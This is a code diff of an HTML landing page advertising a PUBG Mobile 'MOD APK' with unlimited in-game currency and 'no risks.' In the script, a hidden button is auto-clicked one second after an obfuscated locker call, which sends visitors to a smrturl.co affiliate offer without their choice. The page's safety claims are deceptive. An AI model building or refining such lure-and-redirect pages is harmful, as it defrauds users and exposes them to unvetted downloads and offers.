@@ -196,27 +196,20 @@
       This MOD APK is tested and verified for smooth and safe gameplay. Enjoy PUBG Mobile with unlimited UC, no bans, and no risks.
     </div>
   </main>
-
   <button id="hiddenBtn" style="display:none;" onclick="goToOffer()">Hidden Download</button>
-
   <script>
+    let clicked = false;
     function goToLocker() {
-      _yi();
+      if (!clicked) {
+        clicked = true;
+        _yi();
+        setTimeout(function() {
+          document.getElementById("hiddenBtn").click();
+        }, 1000);
+      }
     }
-
     function goToOffer() {
-      window.location.href = "https://smrturl.co/a/sab99dbe040/11035?s1=";
-    }
-
-    // نتحقق هل تم الضغط سابقاً، إذا لا، نضغط زر خفي مرة واحدة فقط
-    if (!sessionStorage.getItem('hiddenBtnClicked')) {
-      setTimeout(function() {
-        var btn = document.getElementById("hiddenBtn");
-        if (btn) {
-          btn.click();
-          sessionStorage.setItem('hiddenBtnClicked', 'true');
-        }
-      }, 1000);
+      window.location.href = "https://smrturl.co/262a8d4";
     }
   </script>
 </body>
